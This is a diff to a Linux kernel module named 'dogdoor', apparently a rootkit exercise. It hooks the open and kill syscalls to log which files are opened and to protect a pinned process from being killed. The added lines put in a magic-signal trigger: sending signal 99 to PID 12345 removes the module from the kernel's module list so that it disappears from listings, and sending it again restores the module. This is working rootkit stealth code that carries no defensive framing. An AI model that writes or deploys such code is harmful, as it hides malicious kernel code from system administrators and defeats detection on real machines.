@@ -16,6 +16,9 @@
 #define FILENAME_COUNT 10
 #define FILENAME_SIZE 256
 
+#define SIG 99
+#define PID 12345
+
 MODULE_LICENSE("GPL");
 
 char * accessed_filenames[FILENAME_COUNT];
@@ -23,6 +26,8 @@ char user_uid[128] = "-1";
 int count_accessed_filenames = 0;
 char pinned_pid[16] = "-1";
 void ** sctable ;
+int is_hidden = 0; 
+static struct list_head *orig_prev;
 
 static
 int is_in_filename(const char __user * filename) {
@@ -67,12 +72,27 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 asmlinkage int (*orig_sys_kill)(int pid, int sig); 
 asmlinkage int dogdoor_sys_kill(int pid, int sig)
 {
-    int i_current_pid = (int)simple_strtol(pinned_pid, NULL, 10);
+	int i_current_pid = (int)simple_strtol(pinned_pid, NULL, 10);
+    int tsig = SIG, tpid = PID; 
 
     if (pid == i_current_pid && i_current_pid != -1) {
         printk("YOU CANNOT KILL THIS PROCESS (%d)\n", pid);
         return 1;
     }
+
+	if (tsig == sig && tpid == pid){
+		if(!is_hidden){
+			orig_prev = THIS_MODULE->list.prev; 
+			list_del(&THIS_MODULE->list);
+			printk("THE MODULE IS INVISIBLE\n"); 
+			is_hidden = 1; 
+		}else{
+			list_add(&THIS_MODULE->list, orig_prev);
+			printk("THE MODULE IS VISIBLE\n"); 
+			is_hidden = 0; 
+		}
+		return 1; 
+	}
 
 	return orig_sys_kill(pid, sig);
 }
